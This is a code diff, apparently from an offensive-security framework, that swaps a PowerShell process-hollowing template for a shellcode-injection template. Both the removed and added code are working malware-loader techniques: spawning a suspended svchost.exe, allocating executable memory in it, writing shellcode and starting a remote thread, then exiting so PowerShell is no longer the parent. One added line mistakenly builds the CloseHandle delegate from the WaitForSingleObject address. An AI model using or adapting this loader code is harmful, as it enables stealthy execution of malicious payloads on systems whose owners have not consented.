@@ -1,4 +1,4 @@
-class processhollow:
+class spawnandinject:
 
     def imports(self) -> list[str]:
         return []
@@ -72,16 +72,18 @@ $GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bin
 $CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")
 
 # Obtain the function addresses of the required hollowing functions
-$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
-$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
 $WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
-$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"
+$CreateRemoteThreadAddr = Get-Function "kernel32.dll" "CreateRemoteThread"
+$VirtualAllocExAddr = Get-Function "kernel32.dll" "VirtualAllocEx"
+$WaitForSingleObjectAddr = Get-Function "kernel32.dll" "WaitForSingleObject"
+$CloseHandle = Get-Function "kernel32.dll" "CloseHandle"
 
 # Create the delegate types to call the previously obtain function addresses
-$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
 $WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
-$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
-$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])
+$CreateRemoteThread = Get-Delegate $CreateRemoteThreadAddr @([IntPtr], [Int32], [IntPtr], [IntPtr], [IntPtr], [Int32], [IntPtr]) ([IntPtr])
+$VirtualAllocEx = Get-Delegate $VirtualAllocExAddr @([IntPtr], [IntPtr], [Int32], [Int32], [Int32]) ([IntPtr])
+$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32])
+$CloseHandle = Get-Delegate $WaitForSingleObjectAddr @([IntPtr])
 
 # Instantiate the required structures for CreateProcess and use them to launch svchost.exe
 $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
@@ -91,40 +93,13 @@ $cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
 $result = $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
 
 # Obtain the required handles from the PROCESS_INFORMATION structure
-$hThread = $processInformation.hThread
 $hProcess = $processInformation.hProcess
 
-# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess
-$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
-$result = $ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)
-
-# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION
-# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image
-# addr is located at offset 0x10.
-$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))
-
-# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200
-# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB
-# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.
-$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
-$result = $ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)
-
-$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
-$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)
-
-# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.
-# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative
-# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally
-# found the non relative entry point address.
-$result = $ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)
-
-$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset
-$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint
-$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint
-
-# Overwrite the entrypoint with shellcode and resume the thread.
-$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
-$ResumeThread.Invoke($hThread)
+$address = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x20)
+$WriteProcessMemory.Invoke($hProcess, $address, $shellcode, $shellcode.Length, [IntPtr]::Zero)
+$thread = $CreateRemoteThread.Invoke($hProcess, 0, [IntPtr]::Zero, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+$WaitForSingleObject.Invoke($thread, 500)
+$CloseHandle.Invoke($thread)
 
 # Close powershell to remove it as the parent of svchost.exe
 exit
